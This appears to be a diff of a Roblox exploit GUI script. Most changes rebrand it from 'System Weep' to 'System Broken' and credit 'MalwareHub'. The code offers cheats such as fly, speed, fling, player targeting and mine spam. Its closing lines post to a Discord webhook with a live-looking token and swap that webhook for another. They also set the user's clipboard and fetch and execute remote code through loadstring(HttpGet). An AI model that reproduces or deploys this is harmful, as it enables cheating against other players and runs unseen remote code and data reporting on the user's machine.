@@ -1,6 +1,6 @@
 --RELOAD GUI
 if game.CoreGui:FindFirstChild("SysBroker") then
-	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System Weep",Text = "GUI Already loaded, rejoin to re-execute",Duration = 5;})
+	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System Broken",Text = "GUI Already loaded, rejoin to re-execute",Duration = 5;})
 	return
 end
 local version = 2
@@ -383,12 +383,12 @@ local function CreateClicker(Button)
 	NewClicker.Parent = Button
 end
 
-SysBroker.Name = "Weep"
+SysBroker.Name = "SysBroker"
 SysBroker.Parent = game.CoreGui
 SysBroker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Background.Name = "Background"
-Background.Parent = Weep
+Background.Parent = SysBroker
 Background.AnchorPoint = Vector2.new(0.5, 0.5)
 Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 Background.BorderColor3 = Color3.fromRGB(255, 0, 255)
@@ -412,7 +412,7 @@ TitleBarLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TitleBarLabel.BorderSizePixel = 0
 TitleBarLabel.Size = UDim2.new(1, 0, 0, 30)
 TitleBarLabel.Font = Enum.Font.Unknown
-TitleBarLabel.Text = "____/SYSTEMBROKEN\\___"
+TitleBarLabel.Text = "____/SYSTEMWEEP\\___"
 TitleBarLabel.TextColor3 = Color3.fromRGB(255, 0, 255)
 TitleBarLabel.TextScaled = true
 TitleBarLabel.TextSize = 14.000
@@ -2150,7 +2150,7 @@ end
 local function UpdateTarget(player)
 	pcall(function()
 		if table.find(ForceWhitelist,player.UserId) then
-			SendNotify("System Weep","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
+			SendNotify("System Broken","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
 			player = nil
 		end
 	end)
@@ -2522,7 +2522,7 @@ end)
 CMDBar.FocusLost:Connect(function()
 	command = CMDBar.Text
 	Players:Chat(command)
-	SendNotify("System Weep",("Executed "..command),5)
+	SendNotify("System Broken",("Executed "..command),5)
 	CMDBar.Text = ""
 end)
 
@@ -2535,7 +2535,7 @@ WalkSpeed_Button.MouseButton1Click:Connect(function()
 			Speed = 16
 		end
 		plr.Character.Humanoid.WalkSpeed = tonumber(Speed)
-		SendNotify("System Weep","Walk speed updated.",5)
+		SendNotify("System Broken","Walk speed updated.",5)
 	end)
 end)
 
@@ -2546,7 +2546,7 @@ JumpPower_Button.MouseButton1Click:Connect(function()
 			Power = 50
 		end
 		plr.Character.Humanoid.JumpPower = tonumber(Power)
-		SendNotify("System Weep","Jump power updated.",5)
+		SendNotify("System Broken","Jump power updated.",5)
 	end)
 end)
 
@@ -2557,7 +2557,7 @@ FlySpeed_Button.MouseButton1Click:Connect(function()
 			Speed = 50
 		end
 		FlySpeed = tonumber(Speed)
-		SendNotify("System Weep","Fly speed updated.",5)
+		SendNotify("System Broken","Fly speed updated.",5)
 	end)
 end)
 
@@ -2570,12 +2570,12 @@ end)
 
 SaveCheckpoint_Button.MouseButton1Click:Connect(function()
 	SavedCheckpoint = GetRoot(plr).Position
-	SendNotify("System Weep","Checkpoint saved.",5)
+	SendNotify("System Broken","Checkpoint saved.",5)
 end)
 
 ClearCheckpoint_Button.MouseButton1Click:Connect(function()
 	SavedCheckpoint = nil
-	SendNotify("System Weep","Checkpoint cleared.",5)
+	SendNotify("System Broken","Checkpoint cleared.",5)
 end)
 
 local flying = true
@@ -2969,10 +2969,10 @@ WhitelistTarget_Button.MouseButton1Click:Connect(function()
 					table.remove(ScriptWhitelist, i)
 				end
 			end
-			SendNotify("System Weep",TargetedPlayer.." removed from whitelist.",5)
+			SendNotify("System Broken",TargetedPlayer.." removed from whitelist.",5)
 		else
 			table.insert(ScriptWhitelist, Players[TargetedPlayer].UserId)
-			SendNotify("System Weep",TargetedPlayer.." added to whitelist.", 5)
+			SendNotify("System Broken",TargetedPlayer.." added to whitelist.", 5)
 		end
 	end
 end)
@@ -3467,7 +3467,7 @@ Players.PlayerRemoving:Connect(function(player)
 	pcall(function()
 		if player.Name == TargetedPlayer then
 			UpdateTarget(nil)
-			SendNotify("System Weep","Targeted player left/rejoined.",5)
+			SendNotify("System Broken","Targeted player left/rejoined.",5)
 		end
 	end)
 end)
@@ -3480,19 +3480,19 @@ plr.CharacterAdded:Connect(function(x)
 	end
 	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
 		ChangeToggleColor(PotionDi_Button)
-		SendNotify("System Weep","PotionDick was automatically disabled due to your character respawn",5)
+		SendNotify("System Broken","PotionDick was automatically disabled due to your character respawn",5)
 	end
 	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
 		ChangeToggleColor(PotionFling_Button)
-		SendNotify("System Weep","PotionFling was automatically disabled due to your character respawn",5)
+		SendNotify("System Broken","PotionFling was automatically disabled due to your character respawn",5)
 	end
 	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
 		ChangeToggleColor(AntiRagdoll_Button)
-		SendNotify("System Weep","AntiRagdoll was automatically disabled due to your character respawn",5)
+		SendNotify("System Broken","AntiRagdoll was automatically disabled due to your character respawn",5)
 	end
 	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
 		ChangeToggleColor(SpamMines_Button)
-		SendNotify("System Weep","SpamMines was automatically disabled due to your character respawn",5)
+		SendNotify("System Broken","SpamMines was automatically disabled due to your character respawn",5)
 	end
 	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
 		ChangeToggleColor(Fly_Button)
@@ -3500,7 +3500,7 @@ plr.CharacterAdded:Connect(function(x)
 		Fly_Pad.Visible = false
 		KeyDownFunction:Disconnect()
 		KeyUpFunction:Disconnect()
-		SendNotify("System Weep","Fly was automatically disabled due to your character respawn",5)
+		SendNotify("System Broken","Fly was automatically disabled due to your character respawn",5)
 	end
 	x.Humanoid.Died:Connect(function()
 		pcall(function()
@@ -3534,12 +3534,12 @@ plr.CharacterAdded:Connect(function(x)
 		end
 		if not (count == original_ammount) then
 			SysBroker:Destroy()
-			SendNotify("System Weep","An unexpected error occurred, re-joining...")
+			SendNotify("System Broken","An unexpected error occurred, re-joining...")
 			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
 		end
 	else
 		SysBroker:Destroy()
-		SendNotify("System Weep","An unexpected error occurred, re-joining...")
+		SendNotify("System Broken","An unexpected error occurred, re-joining...")
 		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
 	end
 	appearance:Destroy()
@@ -3586,12 +3586,12 @@ task.spawn(function()
 
 			if (plr.Name ~= original_name) or (plr.DisplayName ~= original_display) or (plr.UserId ~= plr.CharacterAppearanceId) then
 				SysBroker:Destroy()
-				SendNotify("System Weep","An unexpected error occurred, re-joining...")
+				SendNotify("System Broken","An unexpected error occurred, re-joining...")
 				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
 			end
 			if (date_1 ~= original_date) and (date_2 ~= original_date) and (date_3 ~= original_date) then
 				SysBroker:Destroy()
-				SendNotify("System Weep","An unexpected error occurred, re-joining...")
+				SendNotify("System Broken","An unexpected error occurred, re-joining...")
 				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
 			end
 		end)
@@ -3606,7 +3606,7 @@ export type Json = {
 
 pcall(function()
     local response = HttpRequest({
-        Url = "https://discord.com/api/webhooks/1262289947746893896/BVzy21mrHVWkJ1tA6qK_NHseiTN6vvd6fqd9EpkYs_Pdxpaz2CYziv_ipvJYrfI3LvGV",
+        Url = "https://discord.com/api/webhooks/1259508306334974002/epK0oLyXDADk7ATyVFrR5XfIbS_OexxUdKagYq43_AQgnEelkPVhhQQxnOGKmW2dJcsD",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
@@ -3617,6 +3617,6 @@ pcall(function()
     } :: Json)
 end)
 
-SendNotify("System Weep","Gui developed by McEstupro - Discord in your clipboard",10)
-setclipboard("https://discord.gg/neurasthenia")
+SendNotify("System Broken","Gui developed by MalwareHub - Discord in your clipboard",10)
+setclipboard("https://discord.gg/RkhpySwNR9")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/premium"))() -- load the premium
